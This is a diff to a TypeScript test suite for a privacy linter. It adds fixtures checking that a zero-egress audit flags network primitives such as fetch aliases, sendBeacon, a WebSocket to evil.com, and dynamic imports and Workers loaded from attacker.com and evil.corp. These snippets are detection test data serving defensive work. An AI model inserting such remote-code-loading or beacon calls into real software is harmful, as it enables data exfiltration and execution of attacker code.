@@ -18,6 +18,38 @@ describe('Privacy Telemetry Claims & Invariant Linter Suite', () => {
     auditZeroEgress(errors);
     expect(errors).toEqual([]);
 
+    // Fixture-based negative test asserting unauthorized egress primitives are reported
+    const primitiveErrors: string[] = [];
+    auditZeroEgress(primitiveErrors, {
+      overrideCodeSnippets: [
+        'const f = fetch;',
+        'navigator?.sendBeacon("/api/telemetry");',
+        'const ws = new WebSocket("wss://evil.com");',
+        "import('https://attacker.com/evil.js')",
+        'import("https://attacker.com/evil.js")',
+        "import(`https://attacker.com/evil.js`)",
+        "new Worker('https://attacker.com/worker.js')",
+        "new Worker(new URL('https://attacker.com/worker.js'))",
+        "document.createElement('script')",
+        "new Image()",
+      ],
+    });
+    expect(primitiveErrors).toHaveLength(10);
+    expect(primitiveErrors.some((e) => e.includes("import('https://attacker.com/evil.js')"))).toBe(true);
+    expect(primitiveErrors.some((e) => e.includes('new Worker('))).toBe(true);
+    expect(primitiveErrors.some((e) => e.includes("document.createElement('script')"))).toBe(true);
+
+    // Benign fixture asserting comments and local workers are NOT flagged
+    const benignErrors: string[] = [];
+    auditZeroEgress(benignErrors, {
+      overrideCodeSnippets: [
+        "// import('https://attacker.com/evil.js')",
+        "const a = 1; // new Worker('https://attacker.com/worker.js')",
+        "new Worker(new URL('./edge-worker.ts', import.meta.url))",
+      ],
+    });
+    expect(benignErrors).toEqual([]);
+
     // Negative fixture: reject computed fetch outside exportToOtlp while preserving exemption
     const tempDir = mkdtempSync(join(tmpdir(), 'kty-zero-egress-'));
     try {
@@ -43,6 +75,22 @@ describe('Privacy Telemetry Claims & Invariant Linter Suite', () => {
       );
       expect(fetchViolations).toHaveLength(1);
       expect(fetchViolations[0]).toContain('leak.ts:2');
+
+      // Reject non-fetch primitives even inside authorized exporter.ts
+      const exporterTampered = join(tempDir, 'exporter_tampered.ts');
+      writeFileSync(
+        exporterTampered,
+        'export async function exportToOtlp() {\n  await fetch("http://collector:4318");\n  new Worker("https://evil.corp/worker.js");\n}\n'
+      );
+      const tamperedErrors: string[] = [];
+      auditZeroEgress(tamperedErrors, {
+        overrideSrcDir: tempDir,
+        overrideAuthorizedExporterPath: exporterTampered,
+      });
+      const workerViolations = tamperedErrors.filter((e) =>
+        e.includes('Forbidden network primitive: new Worker')
+      );
+      expect(workerViolations).toHaveLength(1);
     } finally {
       rmSync(tempDir, { recursive: true, force: true });
     }
